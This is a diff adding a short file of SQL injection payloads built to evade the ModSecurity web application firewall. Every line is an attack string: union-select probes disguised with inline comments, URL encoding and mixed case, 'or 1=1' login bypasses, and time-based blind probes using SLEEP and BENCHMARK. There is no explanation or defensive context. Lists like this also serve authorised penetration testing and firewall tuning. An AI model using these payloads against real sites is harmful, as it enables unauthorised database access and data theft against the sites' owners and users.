@@ -1,0 +1,18 @@
+# SQLi ModSecurity WAF Bypass Payloads
+0'/**/union/*&x=%0a*/select/*&y=%0a*/1,2,3--
+' /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3--
+%2F**%2FUNION%2F**%2FSELECT
+' /*!UNION*/ /*!ALL*/ /*!SELECT*/ 1,2,3--
+'-IF(MID(@@version,1,1)='5',SLEEP(5),0)--
+'%20AnD%20sLeEp(5)--
+1'%20or%20'1'%20=%20'1
+' or 1=1-- -
+' /*!or*/ 1=1-- -
+' /*!12345or*/ 1=1-- -
+/*!50000UniOn*//*!50000SeLeCt*/
+' UNION /*!50000SELECT*/ 1,2,3--
+' uni%6fn se%6cect 1,2,3--
+%27%20uni%6Fn%20se%6Cect%201,2,3--
+' AnD BENCHMARK(2999999,MD5(NOW()))--
+'%09UNION%09SELECT%091,2,3--
+'%0BAND%0B1=1--
